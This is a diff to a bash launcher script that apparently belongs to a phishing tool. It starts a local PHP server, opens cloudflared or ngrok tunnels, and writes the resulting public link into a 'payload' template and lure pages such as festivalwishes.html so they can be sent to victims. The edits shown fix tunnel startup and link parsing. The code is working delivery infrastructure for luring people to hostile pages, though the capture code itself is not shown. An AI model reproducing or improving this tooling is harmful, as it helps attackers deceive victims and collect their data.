@@ -260,35 +260,21 @@ fi
 fi
 
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
-php -S 127.0.0.1:3333 > php_server.log 2>&1 & 
+php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
 sleep 2
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting cloudflared tunnel...\n"
 rm -rf .cloudflared_output.log > /dev/null 2>&1
 
-# Create a temporary script to run cloudflared with proper output capture
-cat > .start_cloudflared.sh << 'EOF'
-#!/bin/bash
-exec ./cloudflared tunnel --url http://localhost:3333 2>&1 | tee .cloudflared_output.log
-EOF
+if [[ "$windows_mode" == true ]]; then
+    ./cloudflared.exe tunnel --url http://127.0.0.1:3333 > .cloudflared_output.log 2>&1 &
+else
+    ./cloudflared tunnel --url http://127.0.0.1:3333 > .cloudflared_output.log 2>&1 &
+fi
 
-chmod +x .start_cloudflared.sh
-
-# Use nohup to run in background with proper output capture
-nohup ./.start_cloudflared.sh > /dev/null 2>&1 &
-
-# Wait for the log file to be created and populated
-sleep 3
 max_attempts=15
 attempt=0
-while [[ ! -f .cloudflared_output.log ]] && [[ $attempt -lt $max_attempts ]]; do
-    sleep 2
-    attempt=$((attempt + 1))
-done
-
-# Wait for the URL to appear in the log
-attempt=0
 while [[ $attempt -lt $max_attempts ]]; do
-    link=$(grep -o 'https://[^ ]*\.trycloudflare.com' ".cloudflared_output.log" 2>/dev/null | head -1)
+    link=$(grep -o 'https://[^ ]*\.trycloudflare.com' ".cloudflared_output.log" 2>/dev/null | head -n1)
     if [[ ! -z "$link" ]]; then
         break
     fi
@@ -302,8 +288,8 @@ printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m CloudFlare tunnel service might b
 printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m If you are using android, turn hotspot on\n"
 printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m CloudFlared is already running, run this command killall cloudflared\n"
 printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Check your internet connection\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Try running: ./cloudflared tunnel --url http://localhost:3333 to see specific errors\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m On Windows, try running: cloudflared.exe tunnel --url http://localhost:3333\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Try running: ./cloudflared tunnel --url http://127.0.0.1:3333 to see specific errors\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m On Windows, try running: cloudflared.exe tunnel --url http://127.0.0.1:3333\n"
 exit 1
 else
 printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
@@ -313,7 +299,7 @@ checkfound
 }
 
 payload_cloudflare() {
-link=$(grep -o 'https://[^ ]*\.trycloudflare.com' ".cloudflared_output.log")
+link=$(grep -o 'https://[^ ]*\.trycloudflare.com' ".cloudflared_output.log" | head -n1)
 sed 's+forwarding_link+'$link'+g' template.php > index.php
 if [[ $option_tem -eq 1 ]]; then
 sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
@@ -452,7 +438,7 @@ fi
 
 sleep 10
 
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app' | head -n1)
 if [[ -z "$link" ]]; then
 printf "\e[1;31m[!] Direct link is not generating, check following possible reason  \e[0m\n"
 printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok authtoken is not valid\n"
